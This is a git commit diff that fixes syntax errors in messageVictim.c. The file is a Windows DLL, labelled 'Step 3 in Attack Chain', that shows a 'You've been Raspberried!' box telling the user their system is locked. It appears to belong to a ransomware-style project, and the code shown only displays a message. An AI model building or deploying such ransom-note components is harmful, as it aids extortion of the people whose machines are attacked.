06b3c180ee337edac766fd8e602b672f7649b0f6
onisoyyc <danielosah@outlook.com>
2024-11-27 00:01:01 -0700

    Fix syntax erros in messagVictim.c and PersistanceApproved.c

--- messageVictim.c
+++ messageVictim.c
@@ -5,16 +5,16 @@ Will create a message box to end user telling them their system has been locked
 Step 3 in Attack Chain
 */
 
-#include <widnows.h>
+#include <windows.h>
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD, nReason, LVPOID lpReserved){ // dll entry point
+BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) { // dll entry point
     switch (nReason){
         case DLL_PROCESS_ATTACH:
             MessageBox(
                 NULL, 
                 "You've been Raspberried!", // consult with group for official message
                 "<Evil Laugh>",
-                MD_OK
+                MB_OK
             );
             break;
         case DLL_PROCESS_DETACH:
